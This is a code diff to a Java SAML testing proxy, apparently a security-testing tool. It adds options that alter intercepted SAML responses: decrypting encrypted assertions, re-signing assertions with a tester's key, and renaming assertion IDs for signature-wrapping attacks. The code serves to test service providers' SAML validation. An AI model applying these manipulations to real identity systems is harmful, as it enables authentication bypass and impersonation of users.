@@ -55,6 +55,8 @@ import javax.xml.transform.TransformerException;
 import javax.xml.transform.TransformerFactory;
 import javax.xml.transform.dom.DOMSource;
 import javax.xml.transform.stream.StreamResult;
+import org.apache.xml.security.encryption.XMLCipher;
+import org.apache.xml.security.encryption.XMLEncryptionException;
 import org.apache.xml.security.exceptions.Base64DecodingException;
 import org.apache.xml.security.exceptions.XMLSecurityException;
 import org.apache.xml.security.keys.KeyInfo;
@@ -151,6 +153,12 @@ public class SamlHTTPClient implements HTTPClient {
                     samlProxyHeader += "replayed;";
                 }
 
+                if (this.samlProxyConfig.doDecryptAssertionAttack()) {
+                    String newSamlResponse = decryptAssertion(namedValues[idx].getValue());
+                    namedValues[idx] = new NamedValue(namedValues[idx].getName(), newSamlResponse);
+                    samlProxyHeader += "decrypt assertion;";
+                }
+
                 if (this.samlProxyConfig.doSignWrapAttack()) {
                     String newSamlResponse = signatureWrapping(namedValues[idx].getValue());
                     namedValues[idx] = new NamedValue(namedValues[idx].getName(), newSamlResponse);
@@ -178,6 +186,11 @@ public class SamlHTTPClient implements HTTPClient {
                     samlProxyHeader += "removed assertion signature;";
                 }
 
+                if (this.samlProxyConfig.doSignAssertionAttack()) {
+                    String newSamlResponse = signAssertionMessage(namedValues[idx].getValue());
+                    namedValues[idx] = new NamedValue(namedValues[idx].getName(), newSamlResponse);
+                    samlProxyHeader += "sign assertion;";
+                }
                 if (this.samlProxyConfig.doSignSamlMessage()) {
                     String newSamlResponse = signSamlMessage(namedValues[idx].getValue());
                     namedValues[idx] = new NamedValue(namedValues[idx].getName(), newSamlResponse);
@@ -476,6 +489,41 @@ public class SamlHTTPClient implements HTTPClient {
         return newSamlResponse;
     }
 
+    private String signAssertionMessage(String samlResponse) throws IOException, TransformerConfigurationException, ParserConfigurationException, SAXException, Base64DecodingException, TransformerException, XMLSecurityException {
+        Document document = parseDocument(samlResponse);
+        Element assertionSignatureElement = SamlModel.findAssertionSignatureElement(document);
+        if (null == assertionSignatureElement) {
+            return samlResponse;
+        }
+        Element assertionElement = (Element) assertionSignatureElement.getParentNode();
+        Node beforeNode = assertionSignatureElement.getNextSibling();
+        assertionElement.removeChild(assertionSignatureElement);
+        XMLSignature xmlSignature = new XMLSignature(document, null, XMLSignature.ALGO_ID_SIGNATURE_RSA_SHA1);
+        assertionElement.insertBefore(xmlSignature.getElement(), beforeNode);
+
+        String assertionId = assertionElement.getAttribute("ID");
+        Transforms transforms = new Transforms(document);
+        transforms.addTransform(Transforms.TRANSFORM_ENVELOPED_SIGNATURE);
+        transforms.addTransform(Transforms.TRANSFORM_C14N_EXCL_OMIT_COMMENTS);
+        xmlSignature.addDocument("#" + assertionId, transforms, Constants.ALGO_ID_DIGEST_SHA1);
+
+        KeyStore.PrivateKeyEntry privateKeyEntry = this.samlProxyConfig.getPrivateKeyEntry();
+
+        KeyInfo keyInfo = xmlSignature.getKeyInfo();
+        X509Data x509Data = new X509Data(document);
+        Certificate[] certificateChain = privateKeyEntry.getCertificateChain();
+        for (int certIdx = 0; certIdx < certificateChain.length; certIdx++) {
+            Certificate certificate = certificateChain[certIdx];
+            x509Data.addCertificate((X509Certificate) certificate);
+        }
+        keyInfo.add(x509Data);
+
+        PrivateKey privateKey = privateKeyEntry.getPrivateKey();
+        xmlSignature.sign(privateKey);
+
+        return outputDocument(document);
+    }
+
     private String signSamlMessage(String samlResponse) throws IOException, ParserConfigurationException, SAXException, Base64DecodingException, TransformerConfigurationException, TransformerException, XMLSecurityException {
         Document document = parseDocument(samlResponse);
         Element protocolSignatureElement = SamlModel.findProtocolSignatureElement(document);
@@ -551,6 +599,15 @@ public class SamlHTTPClient implements HTTPClient {
                     String newIdValue = "renamed-" + oldIdValue;
                     idAttr.setValue(newIdValue);
                 }
+                if (this.samlProxyConfig.doRenameLastAssertionId()) {
+                    Attr idAttr = importedParentElement.getAttributeNode("ID"); // SAML 2
+                    if (null == idAttr) {
+                        idAttr = importedParentElement.getAttributeNode("AssertionID"); // SAML 1.1
+                    }
+                    String oldIdValue = idAttr.getValue();
+                    String newIdValue = "renamed-" + oldIdValue;
+                    idAttr.setValue(newIdValue);
+                }
             }
             break;
             case SAMLP_EXTENSIONS: {
@@ -567,6 +624,17 @@ public class SamlHTTPClient implements HTTPClient {
                 Element importedSamlResponseElement = (Element) document.importNode(samlResponseElement, true);
                 samlpExtensionsElement.appendChild(importedSamlResponseElement);
                 samlResponseElement.appendChild(samlpExtensionsElement);
+                if (this.samlProxyConfig.doRenameAssertionId()) {
+                    NodeList saml2AssertionNodeList = document.getElementsByTagNameNS("urn:oasis:names:tc:SAML:2.0:assertion", "Assertion");
+                    Element assertionElement = (Element) saml2AssertionNodeList.item(0);
+                    Attr idAttr = assertionElement.getAttributeNode("ID"); // SAML 2
+                    if (null == idAttr) {
+                        idAttr = assertionElement.getAttributeNode("AssertionID"); // SAML 1.1
+                    }
+                    String oldIdValue = idAttr.getValue();
+                    String newIdValue = "renamed-" + oldIdValue;
+                    idAttr.setValue(newIdValue);
+                }
             }
             break;
             case ASSERTION: {
@@ -651,5 +719,35 @@ public class SamlHTTPClient implements HTTPClient {
         }
 
         return assertionSignatures;
+    }
+
+    private String decryptAssertion(String samlResponse) throws IOException, ParserConfigurationException, SAXException, Base64DecodingException, TransformerException, XMLEncryptionException, Exception {
+        Document document = parseDocument(samlResponse);
+
+        NodeList encryptedAssertionNodeList = document.getElementsByTagNameNS(
+                "urn:oasis:names:tc:SAML:2.0:assertion", "EncryptedAssertion");
+        if (encryptedAssertionNodeList.getLength() == 0) {
+            return samlResponse;
+        }
+
+        Element encryptedAssertionElement = (Element) encryptedAssertionNodeList.item(0);
+        Element encryptedDataElement = (Element) encryptedAssertionElement.getElementsByTagNameNS("http://www.w3.org/2001/04/xmlenc#", "EncryptedData").item(0);
+        if (null == encryptedDataElement) {
+            return samlResponse;
+        }
+        XMLCipher xmlCipher = XMLCipher.getInstance(XMLCipher.AES_128);
+        xmlCipher.init(XMLCipher.DECRYPT_MODE, null);
+        xmlCipher.setKEK(this.samlProxyConfig.getDecryptionPrivateKeyEntry().getPrivateKey());
+        document = xmlCipher.doFinal(document, encryptedDataElement);
+
+        // remove the EncryptedAssertion container
+        encryptedAssertionNodeList = document.getElementsByTagNameNS(
+                "urn:oasis:names:tc:SAML:2.0:assertion", "EncryptedAssertion");
+        encryptedAssertionElement = (Element) encryptedAssertionNodeList.item(0);
+        Element assertionElement = (Element) encryptedAssertionElement.getFirstChild();
+        encryptedAssertionElement.getParentNode().appendChild(assertionElement);
+        encryptedAssertionElement.getParentNode().removeChild(encryptedAssertionElement);
+
+        return outputDocument(document);
     }
 }
